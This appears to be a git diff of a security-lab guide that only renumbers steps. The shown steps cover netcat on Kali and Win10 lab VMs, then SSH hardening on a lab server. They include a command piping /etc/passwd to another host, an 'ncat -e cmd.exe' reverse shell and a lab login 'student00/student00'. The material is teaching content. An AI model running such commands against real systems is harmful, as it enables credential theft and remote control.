@@ -147,18 +147,18 @@ nc Win10-IP 8989
 
 <u>Transferring a file:</u>
 **On Win10 VM**
-7. On Win10 VM, run netcat to listen on port 8082 and direct all incoming data to a file
+1. On Win10 VM, run netcat to listen on port 8082 and direct all incoming data to a file
 ```
 ncat -l -p 8082 > newfile.txt
 ```
 
 **On Kali VM**
-8. Run netcat to connect to the listening netcat on Win10 on port 8082 and direct contents of a file to it
+1. Run netcat to connect to the listening netcat on Win10 on port 8082 and direct contents of a file to it
 ```
 nc Win10-IP 8082 < /etc/passwd
 ```
-9. After a few seconds, press <kbd>Ctrl</kbd>+<kbd>C</kbd> to close netcat on Kali
-10. Check the contents of `newfile.txt` on Win10 VM
+2. After a few seconds, press <kbd>Ctrl</kbd>+<kbd>C</kbd> to close netcat on Kali
+3. Check the contents of `newfile.txt` on Win10 VM
 
 <u>Creating  a reverse shell:</u>
 **On Kali VM**
@@ -168,22 +168,22 @@ nc Win10-IP 1234
 ```
 
 **On Win10 VM**
-2. Run netcat to connect to the listening port on Kali on port 1234 and execute the command shell
+1. Run netcat to connect to the listening port on Kali on port 1234 and execute the command shell
 ```
 ncat -e cmd.exe Kali-IP 1234
 ```
 
 **On Kali VM**
-3. On Kali, the Win10 VM can be accessed
-4. To close the session, type `exit`
+1. On Kali, the Win10 VM can be accessed
+2. To close the session, type `exit`
 
 <u>Banner Grabbing:</u>
-5. To get information on the service running on a certain port, run the following command:
+3. To get information on the service running on a certain port, run the following command:
 ```
 nc -v -b Win10-IP port_number
 ```
 
-6. Press <kbd>Ctrl</kbd>+<kbd>C</kbd>
+4. Press <kbd>Ctrl</kbd>+<kbd>C</kbd>
 
 ## Linux Vulnerabilities
 ### Connecting to a SSH Server and Disabling Remote Root Login using PuTTY
@@ -192,31 +192,31 @@ nc -v -b Win10-IP port_number
 2. Edit the SSH service config file `/etc/ssh/sshd_config` and look for the setting `PermitRootLogin`. It is set to "no" so users are not permitted to do an SSH connection
 
 **On Kali VM**
-3. Try to SSH to web-server2 as user `root` - It should be unsuccessful
+1. Try to SSH to web-server2 as user `root` - It should be unsuccessful
 ```
 ssh root@web-server2-IP
 ```
-4. SSH as user `student00` (password: `student00`)
+2. SSH as user `student00` (password: `student00`)
 ```
 ssh student00@web-server2-IP
 ```
-5. Once logged in as `student00`, type `su -` to switch to the root account
+3. Once logged in as `student00`, type `su -` to switch to the root account
 
 **On web-server2 VM**
-6. Edit the following two files to allow only one IP address (Win10 VM) to connect the SSH service
-7. On `/etc/hosts.deny`, add the following:
+1. Edit the following two files to allow only one IP address (Win10 VM) to connect the SSH service
+2. On `/etc/hosts.deny`, add the following:
 ```
 sshd: ALL
 ```
-8. On `/etc/hosts.allow`, add the following:
+3. On `/etc/hosts.allow`, add the following:
 ```
 sshd: Win10-IP
 ```
-9. Restart the SSH service:
+4. Restart the SSH service:
 ```
 systemctl restart sshd
 ```
-10. Remove the lines  and restart the SSH service to undo all the changes
+5. Remove the lines  and restart the SSH service to undo all the changes
 
 ### Using John the Ripper
 **On Kali VM**
